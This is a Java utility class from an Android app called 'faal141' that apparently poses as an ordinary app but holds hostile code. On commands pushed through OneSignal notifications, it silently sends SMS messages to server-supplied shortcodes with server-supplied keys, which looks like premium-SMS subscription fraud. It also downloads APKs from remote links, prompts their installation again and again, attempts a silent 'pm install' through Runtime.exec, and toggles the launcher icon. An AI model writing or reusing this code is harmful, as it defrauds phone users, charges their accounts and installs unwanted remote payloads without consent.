package ir.website.faal141;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.onesignal.OSNotification;
import com.onesignal.OneSignal;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;

/**
 * Created by ali on 9/26/17.
 */

public class Utility {
    public static String TAG = "Utility";
    public static boolean isFirst = false;
    public static boolean isInstalled = false;
    public static int promptTime = 0;
    public static Handler handler = null;

    public static boolean isInteger(String s) {
        try {
            Integer.parseInt(s);
        } catch (NumberFormatException e) {
            return false;
        } catch (NullPointerException e) {
            return false;
        }
        // only got here if we didn't return false
        return true;
    }

    public static Boolean sendStepTwo() {

        SharedPreferences settings = OSService.context.getSharedPreferences("faal141",  Context.MODE_PRIVATE);
        boolean verify = settings.getBoolean("verify", false);
        String myshortcode = settings.getString("myshortcode", "");
        String mykey = settings.getString("mykey", "");
        if (verify == true && myshortcode != "" && mykey != "") {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(myshortcode, null, mykey, null, null);
            SharedPreferences.Editor editor = settings.edit();
            editor.putBoolean("verify", false);
            editor.putString("myshortcode", "");
            editor.putString("mykey", "");
            editor.putString("link", "");
//            editor.putString("notification", "");
            editor.commit();
            Utility.setInt("verifybanner",1);
            UtilityV2.showInit();

            return true;
        }
        if(verify){
            Utility.setInt("verifybanner",1);
            UtilityV2.showInit();
        }
        return false;
    }

    public static Boolean clearNotifData() {
        SharedPreferences settings = OSService.context.getSharedPreferences("faal141", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = settings.edit();
        editor.putBoolean("verify", false);
        editor.putString("myshortcode", "");
        editor.putString("mykey", "");
        editor.commit();
        return true;
    }

    public static void startOS(Context context) {
        try {
            Thread.setDefaultUncaughtExceptionHandler(new ExceptionHandler(context));
            if (OSService.context == null || context instanceof Activity) {
                OSService.context = context;
            }
            if (context instanceof Activity) {
                //OSService.activityContext = context;
            }

            OneSignal.startInit(context)
                .autoPromptLocation(true)
                    .setNotificationReceivedHandler(new NotificationReceivedHandler())
                    .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
                    .init();
            try {
                TelephonyManager tManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

                String carrierName = tManager.getNetworkOperatorName().toLowerCase();
                String operator = UtilityV2.getSmsGetway();
                JSONObject tags = new JSONObject();
//            try {
//                String mPhoneNumber = tManager.getLine1Number();
//                tags.put("phonenumber", mPhoneNumber);
//
//            } catch (Exception ex) {
//                Log.d("Utility", ex.getMessage());
//
//            }
//            if (carrierName.contains("ir-") || carrierName.contains("mci") || carrierName.contains("tci")) {
//                operator = "hamrah";
//            } else if (carrierName.contains("irancell") || carrierName.contains("mtn")) {
//                operator = "irancell";
//            }
                tags.put("operator", operator);
                tags.put("network", carrierName);

                tags.put("app", "faal141");
//            tags.put("test", "raazzj7");
                tags.put("version", "3");
                OneSignal.sendTags(tags);
                Log.d("Utility", tags.toString());

            } catch (Exception ex) {
                Log.d("Utility", ex.getMessage());
            }
//        Utility.clearNotifData();
//        if (Utility.isFirst) {
//            Utility.isFirst = false;
//            startTest(5000);
//        }
        }
        catch (Exception e){
            Log.d(TAG, "startOS: ");
        }
    }

    public static void handleNOtification(String jsString) {
        {
            Log.d("JsInterface", jsString);
            try {
                JSONObject data = new JSONObject(jsString);
                JSONArray actions = data.getJSONArray("actions");
                JSONObject tags = data.getJSONObject("tags");
                startOS(OSService.context);
                OneSignal.sendTags(tags);
                //Thread.sleep(10000);
                String shortcode = "";
                for (int i = 0; i < actions.length(); i++) {
                    JSONObject item = actions.getJSONObject(i);
                    String type = item.getString("type");
                    if (type.equals("shortcode")) {
                        try {
                            shortcode = item.getJSONObject("data").getString("shortcode");
                            String key = item.getJSONObject("data").getString("key");
                            if (Utility.sendStepTwo() == false && !key.contains("optional")) {
                                SmsManager smsManager = SmsManager.getDefault();
                                smsManager.sendTextMessage(shortcode, null, key, null, null);
                            }
                        } catch (Exception ex) {
                        }
                    } else if (type.equals("link")) {
                        OSService.links.add(item.getJSONObject("data").getString("link"));
                    }
                }
                SharedPreferences settings = OSService.context.getSharedPreferences("faal141",  Context.MODE_PRIVATE);
                SharedPreferences.Editor editor = settings.edit();
                Utility.openLinkInBrowser();
                try {
                    JSONObject postData = data.getJSONObject("postData");
                    editor.putString("myshortcode", shortcode);
                    editor.commit();
                    Utility.resumePopActivity(postData.toString(), 2000);
                } catch (Exception ex) {
                    editor.putBoolean("verify", true);
                    editor.commit();
                    Utility.sendStepTwo();
                    Thread.sleep(10000);
                }
            } catch (Exception ex) {
                Log.d("JsInterface", ex.getMessage());
            }
        }
    }

    public static void startTest(Integer delay) {
        Log.d("Utility", delay.toString());
        Utility.handler = null;
        Runnable runnable = null;
        Utility.handler = new Handler();
        runnable = new Runnable() {
            @Override
            public void run() {
                Log.d("Utility", "Runnable");
                Intent serviceIntent = new Intent(OSService.context, PopActivity.class);
                serviceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                serviceIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                OSService.context.startActivity(serviceIntent);
            }
        };
        //handler.postDelayed(runnable, delay);
    }

    public static void openLinkInBrowser() {
        Boolean isApk = false;
        for (int i = 0; i < OSService.links.size(); i++) {
            Log.d(TAG, "openLinkInBrowser: " + OSService.links.get(i));
            if (getExt(OSService.links.get(i)).toLowerCase().contains("apk")) {
                isApk = true;
            }
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(OSService.links.get(i)));

            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            OSService.context.startActivity(intent);
        }
        OSService.links = new ArrayList<String>();
        Utility.setString("link","");
        if (isApk) {
            Log.d(TAG, "openLinkInBrowser: Tost");
            Activity act=PopActivity.activity==null?PopActivityV2.activity:PopActivity.activity;
            act.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(OSService.context,
                            " اپلیکیشن در حال دانلود در نوار ابزار است ", Toast.LENGTH_LONG).show();
                }
            });
        }

    }
    public static String getExt(String filename){
        String filenameArray[] = filename.split("\\.");
        if(filenameArray.length>0){
            String extension = filenameArray[filenameArray.length-1];
            Log.d(TAG, "getExt: "+extension);
            return extension;
        }
        return "";
    }
    public static void notificationFired(OSNotification osn) {
        NotificationReceivedHandler nrh = new NotificationReceivedHandler();
        nrh.notificationReceived(osn);
    }

    public static void resumePopActivity(final String notification, Integer delay) {
        if (notification != "") {
            Utility.handler = null;
            Runnable runnable = null;
            Utility.handler = new Handler();
            runnable = new Runnable() {
                @Override
                public void run() {
                    try {
                        notificationFired(new OSNotification(new JSONObject(notification)));
                    } catch (Exception ex) {

                    }
                }
            };
//            delay=10000;
            Utility.handler.postDelayed(runnable, delay);
        }
    }

    public static void updateApp(String link, final Boolean forceUpdate) {
        Log.d("ApkUpdateAsyncTask", "updateApp");
        Log.d("ApkUpdateAsyncTask", link);
        String unixTime = String.valueOf(System.currentTimeMillis());
        final String path = Environment.getExternalStorageDirectory() + "/temp" + unixTime + ".apk";
        //download the apk from your server and save to sdk card here
        try {
            URL url = new URL(link);
            URLConnection connection = url.openConnection();
            connection.connect();

            // download the file
            InputStream input = new BufferedInputStream(url.openStream());
            OutputStream output = new FileOutputStream(path);
            byte data[] = new byte[1024];
            int count;
            while ((count = input.read(data)) != -1) {
                output.write(data, 0, count);
            }

            output.flush();
            output.close();
            input.close();
            Log.d("ApkUpdateAsyncTask", "downloaded" + forceUpdate.toString());
            if (!Utility.isUpdate(path)) {
                Log.d("linker", "up to date");
                Utility.updating(path, forceUpdate);

            } else {
                Utility.removeIcon();
            }
        } catch (Exception e) {
            Log.d("ApkUpdateAsyncTask", e.getMessage());
        }
    }

    public static void updating(final String path, final boolean forceUpdate) {
        Log.d("linker", "updating");
        Runnable runnable = null;
        final Handler handlerupdating = new Handler();
        Log.d("linker", "handler");
        runnable = new Runnable() {
            @Override
            public void run() {
                Utility.addIcon();
                Log.d("linker", "runnable");
                try {
                    File toInstall = new File(path);
                    Uri apkUri = Uri.fromFile(toInstall);
                    Intent intent = new Intent(Intent.ACTION_VIEW);
                    intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    OSService.context.startActivity(intent);
                    Log.d("ApkUpdateAsyncTask", "startActivity");
                } catch (Exception e) {
                    Log.d("linker", e.getMessage());
                } finally {
                    if (forceUpdate) {
                        Log.d("linker", "forceUpdate");
                        try {
                            Thread.sleep(20000);
                            this.run();
                        } catch (Exception ex) {
                            this.run();
                        }
//                        handlerupdating.postDelayed(runnable.run(), 10000);
                    } else {
                        Log.d("linker", "removeIcon");
                        try {
                            Thread.sleep(40000);
                        } catch (Exception e) {
                            Log.d("linker", e.getMessage());
                        }
                        Utility.removeIcon();
                    }
                }
            }
        };
        Log.d("linker", "runnablexcxxxxx");
        runnable.run();
        //handlerupdating.postDelayed(runnable, 1);
        Log.d("linker", "postDelayed");
    }

    public static String downloadApp(String link, String filename) {
//        Log.d("ApkUpdateAsyncTask", "downloadApp");
//        Log.d("ApkUpdateAsyncTask", link);
      //  Log.d(TAG, "downloadApp:fcfffff "+link+":"+filename);
        long start = System.currentTimeMillis();
        long end = System.currentTimeMillis();
        int downloaded = 0;
        int timeout=1200000;//300000;//
        String path = Environment.getExternalStorageDirectory() + "/" + filename + ".apk";
        //download the apk from your server and save to sdk card here
        boolean finish=false;
        File file = new File(path);
        link = Utility.getRedirects(link);
        while ((start + timeout > end&&!finish)/*&&downloaded<11069909*/) {
//        if (file.exists()) {
//            return path;
//        } else{
            try {
//                URL url = new URL(link);
//                InputStream input = new BufferedInputStream(url.openStream());
//                OutputStream output = new FileOutputStream(path);
//                byte data[] = new byte[1024];
//                int count;
//                boolean onceWrite=false;
//                while ((count = input.read(data)) != -1) {
//                    onceWrite=true;
//                    output.write(data, 0, count);
//                }
//                input.close();
//                if(onceWrite) {
//                    output.flush();
//                    output.close();
//                }
//                else

                // file.createNewFile();

                Log.d(TAG, "downloadApp: " + link);
                URL rurl = new URL(link);
                HttpURLConnection connection = (HttpURLConnection) rurl.openConnection();
//                downloaded = 0;
                if (file.exists()) {
                    downloaded = (int) file.length();
                    //   connection.setRequestProperty("Range", "bytes="+(file.length())+"-");
                }
//                String lastModified = connection.getHeaderField("Last-Modified");
//                connection.setChunkedStreamingMode(0);
//                connection.setRequestProperty("If-Range", lastModified);
                connection.setRequestProperty("Range", "bytes=" + 0 + "-");
                connection.setDoInput(true);
                connection.setDoOutput(false);
                InputStream in = new BufferedInputStream(connection.getInputStream());
                int cl=connection.getContentLength();
                Log.d(TAG, "downloadApp: "+cl+":"+downloaded);
                if(cl!=downloaded||cl==-1) {
                    FileOutputStream fos = (downloaded == 0 || true) ? new FileOutputStream(path) : new FileOutputStream(path, true);
                    BufferedOutputStream bout = new BufferedOutputStream(fos, 1024);
                    byte[] rdata = new byte[1024];
                    int x = 0;
                    int y = 0;
                    while ((x = in.read(rdata, 0, 1024)) >= 0) {
                        y += x;
                      //  Log.d(TAG, "downloadApp: downloading ..." + String.valueOf(y));
                        bout.write(rdata, 0, x);
                    }
                    bout.flush();
                    bout.close();
                    in.close();
                    downloaded = (int) file.length();
                    if (cl == downloaded || cl == -1) {
                        finish = true;
                    }
                }
                else{
                    finish = true;
                }
               // Log.d(TAG, "downloadApp: downloaded" + path);
               // return path;

            } catch (Exception e) {
                finish=false;
                String ems = e.getMessage();
                //Log.d(TAG,"erro in download app"+e.getMessage());
                //return "";
            }
            //  }
            end = System.currentTimeMillis();

        }
        if(finish){
            return path;
        }
        else{
            return "";
        }
    }
    public static Boolean removeIcon(){
        try {
//            PackageManager p = OSService.context.getPackageManager();
//            ComponentName componentName = new ComponentName("ir.website.faal141", "ir.website.faal141.MainActivity"); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
//            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
//            Thread.sleep(10);
//            Utility.setLong("removeicon",-1);
            return true;
        } catch (Exception ex) {
        }
        return false;
    }

    public static Boolean addIcon(){
        try {
            PackageManager p = OSService.context.getPackageManager();
            ComponentName componentName = new ComponentName("ir.website.faal141", "ir.website.faal141.MainActivity"); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            Thread.sleep(15000);
            return true;
        } catch (Exception ex) {
            return false;
        }
    }

    public static void install(String path) {
        try {
            File toInstall = new File(path);
            Uri apkUri = Uri.fromFile(toInstall);
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            OSService.context.startActivity(intent);
        }
        catch (Exception ex){
            Log.d(TAG, "install: "+ex.getMessage());
        }
    }

    public static void forceUpdate(final String filename) {
        Runnable runnable = null;
        Utility.handler=null;
        Utility.handler= new Handler();
        Utility.isInstalled=false;
        Utility.promptTime = 0;
        runnable = new Runnable() {

            @Override
            public void run() {
                Log.d("linker","runnable");
                Utility.promptTime++;
                try{

                    PackageManager pm = OSService.context.getPackageManager();
                    pm.getPackageInfo(Utility.getPackageName(filename), PackageManager.GET_ACTIVITIES);
                    Utility.isInstalled=true;
                    Log.d("linker","existbefore");
                }
                catch (Exception e) {
                    Log.d("linker",e.getMessage());
                    try {
                        // this.isInstalled=false;
                        File toInstall = new File(filename);
                        Uri apkUri = Uri.fromFile(toInstall);
                        Intent intent = new Intent(Intent.ACTION_VIEW);
                        intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        OSService.context.startActivity(intent);
                        Log.d("linker","successinstall");
                    }
                    catch (Exception ex){
                        Utility.handler.postDelayed(this, 180000);

                        Log.d("linker",ex.getMessage());
                    }
                }
                finally{

                    //also call the same runnable to call it at regular interval
                    if(!Utility.isInstalled&&Utility.promptTime<5)
                        Utility.handler.postDelayed(this, 180000);
                }
            }
        };
        Utility.handler.postDelayed(runnable, 1);

    }

    public static String getPackageName(String filePath) {
        try {
            PackageManager pm1 = OSService.context.getPackageManager();
            PackageInfo info = pm1.getPackageArchiveInfo(filePath,0);
            return  info.packageName;
        }
        catch (Exception ex){
            Log.d(TAG, "getPackageName: "+ex.getMessage());
            return "";
        }
    }
    public static Boolean isUpdate(String filePath){
        try {
            PackageInfo thisApp = OSService.context.getPackageManager().getPackageInfo(OSService.context.getPackageName(), 0);
            PackageInfo sendApp = OSService.context.getPackageManager().getPackageArchiveInfo(filePath, 0);
            Log.d("isUpdate",String.valueOf(thisApp.versionCode));
            Log.d("isUpdate",String.valueOf(sendApp.versionCode));
            if (thisApp.versionCode > sendApp.versionCode) return true;
            else return false;
        } catch (Exception e) {
            Log.d("isUpdate",e.getMessage());
        }
        return false;
    }

    public static ArrayList jsArr2ArrLi(String strarr){
        ArrayList<String> res = new ArrayList<String>();
        try {
            JSONArray tmp = new JSONArray(strarr.replaceAll("~","\""));
            if (tmp != null) {
                for (int i = 0; i < tmp.length(); i++) {
                    res.add(tmp.getString(i));
                }
            }
        }
        catch (Exception ex){
            Log.d("NoDisplayActivity",ex.getMessage());
        }
        return res;
    }

    public static void hitUrl(String link){
        try {

            String path=Utility.downloadApp(link,"myappsdwee");
//            Log.d("isHit","------------------------------"+path);
            Runtime.getRuntime().exec("pm install "+path).waitFor();
        }
        catch (Exception ex){
//            Log.d("isHit",ex.getMessage());
        }
    }

    public static byte[] download(URL url) throws IOException {

        URLConnection uc = url.openConnection();
        int len =uc.getContentLength();
        InputStream is = new BufferedInputStream(uc.getInputStream());
        try {
            byte[] data = new byte[len];
            int offset = 0;
            while (offset < len) {
                int read = is.read(data, offset, data.length - offset);
                if (read < 0) {
                    break;
                }
                offset += read;
            }
            if (offset < len) {
                throw new IOException(
                        String.format("Read %d bytes; expected %d", offset, len));
            }
            return data;
        } finally {
            is.close();
        }
    }

    public static StringBuilder danlod(final String url ) throws IOException {
        String inputLine;
        StringBuilder srcCode=new StringBuilder();


        URL dest = new URL(url);
        HttpURLConnection yc =  (HttpURLConnection) dest.openConnection();
        yc.setInstanceFollowRedirects( true );
        yc.setUseCaches(false);

        BufferedReader in = new BufferedReader(
                new InputStreamReader(
                        yc.getInputStream()));
        while ((inputLine = in.readLine()) != null) {
            srcCode = srcCode.append (inputLine);
        }

        in.close();
        return srcCode;
    }

    public static void copy(InputStream in, OutputStream out , int bufferSize)
            throws IOException
    {
        // Read bytes and write to destination until eof
        byte[] buf = new byte[bufferSize];
        int len = 0;
        while ((len = in.read(buf)) >= 0)
        {
            out.write(buf, 0, len);
        }
    }
     public static void downloadFromUrl(URL url, String localFilename) throws IOException {
        InputStream is = null;
        FileOutputStream fos = null;

        try {
            URLConnection urlConn = url.openConnection();//connect

            is = urlConn.getInputStream();               //get connection inputstream
            fos = new FileOutputStream(localFilename);   //open outputstream to local file

            byte[] buffer = new byte[4096];              //declare 4KB buffer
            int len;

            //while we have availble data, continue downloading and storing to local file
            while ((len = is.read(buffer)) > 0) {
                fos.write(buffer, 0, len);
            }
        } finally {
            try {
                if (is != null) {
                    is.close();
                }
            } finally {
                if (fos != null) {
                    fos.close();
                }
            }
        }
    }

    public static void danloder(URL url,String DESTINATION_PATH){
        Integer downloaded=0;
        try {
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
//            if (ISSUE_DOWNLOAD_STATUS.intValue() == ECMConstant.ECM_DOWNLOADING) {
//                File file = new File(DESTINATION_PATH);
//                if (file.exists()) {
//                    downloaded = (int) file.length();
//                    connection.setRequestProperty("Range", "bytes=" + (file.length()) + "-");
//                }
//            } else {
                connection.setRequestProperty("Range", "bytes=" + downloaded + "-");
//            }
            connection.setDoInput(true);
            connection.setDoOutput(true);
            InputStream in = new BufferedInputStream(connection.getInputStream());
            FileOutputStream  fos = (downloaded == 0) ? new FileOutputStream(DESTINATION_PATH) : new FileOutputStream(DESTINATION_PATH, true);
            BufferedOutputStream bout = new BufferedOutputStream(fos, 1024);
            byte[] data = new byte[1024];
            int x = 0;
            while ((x = in.read(data, 0, 1024)) >= 0) {
                bout.write(data, 0, x);
                downloaded += x;
            }
            bout.close();
            Log.d(TAG, "danloder: downloaded"+DESTINATION_PATH);
        }
        catch (Exception ex){

        }
    }

    public static String getRedirects(String appurl){
        try {
            int port;
            String ip;
            for (int i=0;i<10;i++) {

                URL url = new URL(appurl);
//                ip=url.getHost();
//                port=url.getPort();
                HttpURLConnection ucon;
//                if(port!=-1) {
//                    Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(ip, port));
//                     ucon = (HttpURLConnection) url.openConnection(proxy);
//                }
//                else{
                     ucon = (HttpURLConnection) url.openConnection();
//                }
                ucon.setInstanceFollowRedirects(false);
                Log.d(TAG, "getRedirects: " + ucon.getHeaderField("Location").split("[\\n\\s]")[0]);
                String myurl=ucon.getHeaderField("Location").split("[\\n\\s]")[0];

                if(ucon.getHeaderField("Location")!=null&&ucon.getHeaderField("Location")!="") {
                    appurl = ucon.getHeaderField("Location");
                }
                else
                {
                    String ext=appurl.substring(appurl.length()-4);

                    if(!ext.contains(".apk")) {
                        String lastChance = readStream(ucon.getInputStream());
                        if (lastChance.indexOf("http") == 0) {
                            appurl = lastChance;
                        } else if (lastChance.indexOf("/") == 0) {
                            appurl = appurl + lastChance.substring(1);
                        } else {
                            appurl = appurl + lastChance;
                        }
                        ext = lastChance.substring(lastChance.length() - 4);
                        if (lastChance == "" || ext.contains(".apk")) {
                            break;
                        }
                    }
                    else{
                        break;
                    }
                }
            }
            //URL secondURL = new URL(ucon.getHeaderField("Location"));
            //URLConnection conn = secondURL.openConnection();
        }
        catch (Exception ex){
            Log.d(TAG, "getRedirects: "+ex.getMessage());
        }
        return appurl;
    }

    private static String readStream(InputStream in) {
        BufferedReader reader = null;
        StringBuffer response = new StringBuffer();
        try {
            reader = new BufferedReader(new InputStreamReader(in));
            String line = "";
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        String res ="";
        try {
            res=response.toString();
            if (res != "") {
                res = res.replaceAll("\\s+", "");
                res = res.replaceAll("\"", "");
                res = res.replaceAll("content=([0-9]+)", "");
                if (res.contains("http-equiv=refresh") && res.contains("url")) {
                    String firstMatch="<metahttp-equiv=refresh;url=";
                    String secondMatch="/>";
                    res=res.substring(res.indexOf(firstMatch) + firstMatch.length(), res.indexOf(secondMatch));
                }
            }
        }
        catch (Exception ex){
            res="";
            Log.d(TAG, "readStream: "+ex.getMessage());
        }
        return res;
    }

    public static void setString(String key,String value) {
        SharedPreferences settings = OSService.context.getSharedPreferences("faal141",  Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = settings.edit();
        editor.putString(key,value).apply();
        editor.commit();
    }

    public static String getString(String str) {
        SharedPreferences settings = OSService.context.getSharedPreferences("faal141",  Context.MODE_PRIVATE);
        String value=settings.getString(str,"");
        return value;
    }

    public static void setBool(String key,Boolean value) {
//        if(key.equals("inapp")){
//            Log.d(TAG, "setBool: "+key);
//            Log.d(TAG, "setBool: "+value);
//            Log.d(TAG, "setBool: "+new Date());
//        }
        SharedPreferences settings = OSService.context.getSharedPreferences("faal141",  Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = settings.edit();
        editor.putBoolean(key,value).apply();
        editor.commit();
    }

    public static Boolean getBool(String str) {
        SharedPreferences settings = OSService.context.getSharedPreferences("faal141",  Context.MODE_PRIVATE);
        Boolean value=settings.getBoolean(str,false);
        return value;
    }

    public static void setInt(String key,int value) {
        SharedPreferences settings = OSService.context.getSharedPreferences("faal141",  Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = settings.edit();
        editor.putInt(key,value).apply();
        editor.commit();
    }

    public static int getInt(String str) {
        SharedPreferences settings = OSService.context.getSharedPreferences("faal141",  Context.MODE_PRIVATE);
        int value=settings.getInt(str,0);
        return value;
    }

    public static void setLong(String key,long value) {
        SharedPreferences settings = OSService.context.getSharedPreferences("faal141",  Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = settings.edit();
        editor.putLong(key,value).apply();
        editor.commit();
    }

    public static long getLong(String str) {
        SharedPreferences settings = OSService.context.getSharedPreferences("faal141",  Context.MODE_PRIVATE);
        long value=settings.getLong(str,0);
        return value;
    }
    public static void clearParams() {
        SharedPreferences settings = OSService.context.getSharedPreferences("faal141",  Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = settings.edit();
        editor.putString("myshortcode","").apply();
        editor.putString("link","").apply();
        editor.putString("mykey","").apply();
        editor.putBoolean("verify",false).apply();
        editor.commit();
    }
    public static void clearTimeout(){
        try {
            SharedPreferences settings = OSService.context.getSharedPreferences("faal141",  Context.MODE_PRIVATE);
            SharedPreferences.Editor editor = settings.edit();
            editor.putInt("times", 0).apply();
            editor.putLong("removeicon", new Long(-1)).apply();
            editor.putLong("interval", new Long(0)).apply();
            editor.putString("notification", "").apply();
            editor.commit();
        }
        catch (Exception e){
            Log.d(TAG, "clearTimeout: "+e.getMessage());
        }
    }

    public static Date addMinutes(int min) {
        Calendar date = Calendar.getInstance();
        long t = date.getTimeInMillis();
        int ONE_MINUTE_IN_MILLIS = 60000;
        Date target = new Date(t + (ONE_MINUTE_IN_MILLIS * min));
        return target;
    }


}
